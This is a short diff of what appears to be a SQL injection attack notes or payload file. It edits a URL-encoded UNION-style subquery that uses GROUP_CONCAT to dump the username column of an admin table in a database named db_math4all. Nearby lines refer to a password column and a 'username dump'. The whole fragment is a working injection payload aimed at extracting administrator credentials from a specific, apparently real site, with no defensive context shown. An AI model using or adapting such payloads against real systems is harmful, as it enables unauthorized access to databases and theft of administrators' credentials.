@@ -153,7 +153,7 @@ column: password
 column: 
 
 # query
-(SELECT+GROUP_CONCAT(name+SEPARATOR+0x3c62723e)+FROM+db_math4all.admin)
+(SELECT+GROUP_CONCAT(username+SEPARATOR+0x3c62723e)+FROM+db_math4all.admin)
 
 
 # username dump
